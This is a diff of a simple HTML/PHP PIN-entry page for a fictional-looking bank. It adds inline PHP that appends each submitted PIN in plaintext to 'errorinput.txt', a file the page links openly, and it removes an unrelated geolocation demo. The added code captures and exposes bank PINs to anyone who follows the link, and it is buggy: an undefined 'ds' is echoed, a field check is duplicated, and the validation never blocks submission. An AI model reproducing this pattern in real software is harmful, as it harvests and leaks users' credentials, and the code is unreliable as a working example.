@@ -4,10 +4,12 @@
 <link rel="stylesheet" type="text/css" href="main.css">
 </head>
 <body class="bg">
+
 <center>
 <br><br><br><br><br><br><br><br><br><br><br>
 <div>
-  <form name="login" action="login.php" method="POST">
+  <form name="login" action="login.php" method="POST" onsubmit ="allnumeric(NumberOnly)">
+  
  <br><br><br><br>
 <div>
 <p id="demo"></p>
@@ -15,17 +17,69 @@
 <script>
 document.getElementById("demo").innerHTML = Date();
 </script>
-
- 
+  <label><B> WELCOME TO ABC PVT BANK </B></label> <br><br>
+   <img src ="images/1.jpg" width="92" height="112" alt="userimage"><br><br><br>
   <label><B>Please Enter Your PIN</B></label> <br><br>
  
+
+  <script type="text/javascript">
+function allnumeric(uzip)
+{
+	var number =/^[0-9]+$/;
+	if (uzip.value.match(number))
+	{
+		return true;
+	}
 	
-<input type="password" name="PIN" class="input" required>
+	else
+	{
+		alert ("vales only");
+		
+	}
+	uzip.focus();
+    return false;
+
+}
+
+</script>
+
+
+
+ 
+<input type="password" name="PIN" class="input"  id="NumberOnly" required>
+
 <br><br>
   
 </div>
 <input class="input" type="submit" name="submit" value="Submit" required>
 <br><br>
+
+<a href='errorinput.txt'>Text file</a>
+
+
+<?php
+
+
+session_start();
+
+echo ds; 
+
+
+
+
+
+$txt = "errorinput.txt"; 
+$fh = fopen($txt, 'w+'); 
+if (isset($_POST['PIN']) && isset($_POST['PIN'])) { // check if both fields are set
+   $txt=$_POST['PIN'].' - '.$_POST['PIN']; 
+   file_put_contents('errorinput.txt',$txt."\n",FILE_APPEND); // log to data.txt 
+   exit();
+}
+    fwrite($fh,$txt); // Write information to the file
+    fclose($fh); // Close the file
+    ?>
+
+
 
 </form>
 </div>
@@ -38,30 +92,6 @@ document.getElementById("demo").innerHTML = Date();
 
 
 </body>
-<!DOCTYPE html>
-<html>
-
-<body onload ="getLocation()">
-
-<p id="demo"></p>
-
-<script>
-var x = document.getElementById("demo");
-
-function getLocation() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition);
-    } else { 
-        x.innerHTML = "Geolocation is not supported by this browser.";
-    }
-}
-
-function showPosition(position) {
-    x.innerHTML = "Latitude: " + position.coords.latitude + 
-    "<br><br>Longitude: " + position.coords.longitude;	
-}
-</script>
-
 
 
 </body>
